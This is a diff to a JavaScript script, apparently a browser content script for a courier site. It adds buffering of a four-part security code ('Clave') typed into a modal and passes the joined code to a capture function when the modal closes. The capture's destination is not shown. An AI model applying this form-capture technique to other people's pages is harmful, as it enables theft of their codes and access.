@@ -3,6 +3,7 @@ const CONTENT_STATE_KEY = '__shalomRecordarContentState__';
 const DOC_INPUT_ID = 'inputnombre';
 const OS_INPUT_ID = 'inputnroguia';
 const CLAVE_FIELDS = ['swal-input1', 'swal-input2', 'swal-input3', 'swal-input4'];
+const CLAVE_MODAL_ID = 'modalValidarCodigo';
 const DEDUPE_WINDOW_MS = 1500;
 
 function getContentState() {
@@ -121,16 +122,47 @@ function captureOs(target, source, eventTimeStamp) {
 function captureClave(target, source, eventTimeStamp) {
     const value = normalizeText(getFieldValue(target));
     if (!value) return;
+    const state = getContentState();
+    state.claveBuffer ||= {};
+    state.claveBuffer[source] = value;
+}
 
-    const visibleFields = CLAVE_FIELDS
-        .map((fieldId) => document.getElementById(fieldId))
-        .filter(Boolean);
+function getClaveCompleta() {
+    const state = getContentState();
+    const buffer = state.claveBuffer || {};
+    const visibleFields = CLAVE_FIELDS.map((fieldId) => document.getElementById(fieldId)).filter(Boolean);
     const claveCompleta = visibleFields.length > 0
-        ? visibleFields.map((field) => normalizeText(getFieldValue(field))).join('')
-        : value;
+        ? visibleFields.map((field) => normalizeText(getFieldValue(field)) || buffer[getInputId(field)] || '').join('')
+        : CLAVE_FIELDS.map((fieldId) => buffer[fieldId] || '').join('');
 
     if (!claveCompleta) return;
-    sendCapture('Clave', claveCompleta, source, eventTimeStamp);
+    return claveCompleta;
+}
+
+function sendClaveCapture(eventTimeStamp) {
+    const claveCompleta = getClaveCompleta();
+    if (!claveCompleta) return;
+    sendCapture('Clave', claveCompleta, CLAVE_MODAL_ID, eventTimeStamp);
+    const state = getContentState();
+    state.claveBuffer = {};
+}
+
+function ensureClaveModalObserver() {
+    const state = getContentState();
+    if (state.claveModalObserverAttached || typeof MutationObserver === 'undefined') return;
+
+    const modal = document.getElementById(CLAVE_MODAL_ID);
+    if (!modal) return;
+
+    state.claveModalObserverAttached = true;
+    const modalObserver = new MutationObserver(() => {
+        const style = modal.getAttribute('style') || '';
+        if (style.includes('display: none')) {
+            sendClaveCapture(Date.now());
+        }
+    });
+    modalObserver.observe(modal, { attributes: true, attributeFilter: ['style'] });
+    state.claveModalObserver = modalObserver;
 }
 
 function handleCapture(event) {
@@ -142,13 +174,13 @@ function handleCapture(event) {
     const source = getInputSource(target);
     if (!isRelevantField(target)) return;
 
-    if (isOsField(target)) {
-        captureOs(target, source, event.timeStamp);
+    if (isClaveField(target)) {
+        captureClave(target, source, event.timeStamp);
         return;
     }
 
-    if (isClaveField(target)) {
-        captureClave(target, source, event.timeStamp);
+    if (isOsField(target)) {
+        captureOs(target, source, event.timeStamp);
         return;
     }
 
@@ -175,10 +207,12 @@ function ensureMutationObserver() {
     state.captureObserverAttached = true;
     const observer = new MutationObserver(() => {
         ensureDocumentListener();
+        ensureClaveModalObserver();
     });
 
     observer.observe(root, { childList: true, subtree: true });
     state.captureObserver = observer;
+    ensureClaveModalObserver();
 }
 
 ensureDocumentListener();
